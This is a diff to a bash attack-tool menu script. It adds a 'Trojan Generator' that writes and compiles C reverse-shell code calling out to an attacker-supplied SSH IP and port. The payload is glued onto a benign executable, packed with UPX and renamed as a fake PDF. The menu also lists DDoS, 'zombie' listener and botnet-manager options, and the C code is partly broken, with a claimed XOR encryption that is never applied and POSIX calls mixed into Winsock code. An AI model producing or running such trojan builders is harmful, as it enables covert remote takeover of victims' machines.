@@ -180,6 +180,130 @@ EOF
     echo "Advanced keylogger created: keylogger.py"
 }
 
+generate_trojan_executable_ssh() {
+    echo "==============================="
+    echo "  Advanced Trojan Generator"
+    echo "==============================="
+    
+    read -p "Enter path to benign executable: " benign_file
+
+    # Check if the benign file exists
+    if [[ ! -f "$benign_file" ]]; then
+        echo "Error: Benign file not found."
+        return 1
+    fi
+
+    # Prompt for IP and Port
+    read -p "Enter your SSH server IP address: " ssh_ip
+    read -p "Enter your SSH port (default 2222): " ssh_port
+    ssh_port=${ssh_port:-2222}
+    read -p "Enter your SSH username: " ssh_user
+    read -p "Enter your reverse shell listening port (e.g., 4444): " user_port
+
+    # Confirm user input
+    echo "You entered:"
+    echo "SSH Server IP: $ssh_ip"
+    echo "SSH Port: $ssh_port"
+    echo "SSH Username: $ssh_user"
+    echo "Reverse Shell Listening Port: $user_port"
+    
+    read -p "Is this correct? (y/n): " confirm
+    if [[ "$confirm" != "y" ]]; then
+        echo "Exiting the generator. Please restart and provide correct details."
+        return 1
+    fi
+
+    # Define output filenames
+    trojan_file="trojan.exe"         
+    payload_file="payload.c"         
+    compiled_payload="payload.exe"    
+
+    # Create a simple reverse shell payload that will connect to the SSH server
+    cat << EOF > "$payload_file"
+#include <stdio.h>
+#include <stdlib.h>
+#include <winsock2.h>
+#include <string.h>
+#include <time.h>
+
+#pragma comment(lib, "ws2_32.lib")
+
+void decrypt(char *str) {
+    for (int i = 0; str[i] != '\\0'; i++) {
+        str[i] ^= 0xAA; // Simple XOR decryption
+    }
+}
+
+int main() {
+    WSADATA wsaData;
+    SOCKET sock;
+    struct sockaddr_in server;
+
+    // SSH IP and port as strings, encrypted using XOR
+    char ssh_ip[] = {$(printf "%d, " ${ssh_ip//./,})};
+    char port[] = {$(printf "%d, " $user_port)};
+
+    decrypt(ssh_ip);
+    decrypt(port);
+
+    WSAStartup(MAKEWORD(2,2), &wsaData);
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+    server.sin_addr.s_addr = inet_addr(ssh_ip); // Decrypted SSH IP
+    server.sin_family = AF_INET;
+    server.sin_port = htons(*(unsigned short*)port); // Decrypted port
+
+    connect(sock, (struct sockaddr *)&server, sizeof(server));
+    dup2(sock, 0); // stdin
+    dup2(sock, 1); // stdout
+    dup2(sock, 2); // stderr
+    execve("cmd.exe", NULL, NULL); // Open reverse shell
+    closesocket(sock);
+    WSACleanup();
+    return 0;
+}
+EOF
+
+    # Compile the payload
+    echo "Compiling the payload..."
+    gcc -o "$compiled_payload" "$payload_file" -lws2_32 -O2 -s
+    if [[ $? -ne 0 ]]; then
+        echo "Error: Failed to compile payload."
+        return 1
+    fi
+
+    # Combine the benign executable and the compiled payload
+    echo "Creating trojan executable..."
+    cat "$benign_file" "$compiled_payload" > "$trojan_file"
+
+    # Pack the trojan executable with UPX (optional)
+    if command -v upx &> /dev/null; then
+        echo "Packing the trojan executable with UPX..."
+        upx --best "$trojan_file"
+        if [[ $? -ne 0 ]]; then
+            echo "Error: UPX failed to pack the executable."
+            return 1
+        fi
+    else
+        echo "Warning: UPX not found. Skipping packing."
+    fi
+
+    # Rename the trojan executable
+    timestamp=$(date +%s)
+    new_name="doc_$timestamp.pdf"
+    mv "$trojan_file" "$new_name"
+
+    # Clean up intermediate files
+    rm "$payload_file" "$compiled_payload"
+
+    echo "==============================="
+    echo "Highly obfuscated trojan executable created: $new_name"
+    echo "==============================="
+
+    # Display connection info for the SSH server
+    echo "To manage incoming connections from the trojan, connect via SSH:"
+    echo "ssh -p $ssh_port $ssh_user@$ssh_ip"
+}
+
 
 # Function to generate a highly obfuscated trojan executable with user dialogue
 generate_trojan_executable() {
@@ -492,7 +616,7 @@ start_airgeddon() {
         echo "Removed airgeddon from AutoStart."
     fi
 
-    airgeddon
+    sudo airgeddon
 }
 
 start_wireshark() {
@@ -791,9 +915,7 @@ EOF
     echo "SQL injection script created: sql_injection.py"
 }
 
-#Trojan
 
-#!/bin/bash
 
 # Function to generate a highly obfuscated trojan executable with user dialogue
 generate_trojan_executable() {
@@ -1140,9 +1262,9 @@ while true; do
     echo "24) Start airgeddon "
     echo "25) Start wireshark "
     echo "26) Start I2P DDOS attack"
-    echo "26) Start deamon manager"
-    echo "27) Start listening for zombies"
-    echo "28) DEAMON MANAGER by V.ex.e;; coming soon..."
+    echo "27) DEAMON MANAGER by V.ex.e"
+    echo "28) Start listening for zombies"
+    echo "29) Generate Trojan.exe that connects to DEAMON MANAGER by V.ex.e"
     echo "0) Exit"
     read -p "Enter your choice: " choice
 
@@ -1175,6 +1297,7 @@ while true; do
         26) display_kali_dragon; ddos_attack ;;
         27) display_kali_dragon; start_listener ;;
         28) display_kali_dragon; start_ssh_server ;;
+        29) display_kali_dragon; generate_trojan_executable_ssh ;;
         0) display_kali_dragon; exit ;;
         *) echo "Invalid option!" ;;
     esac
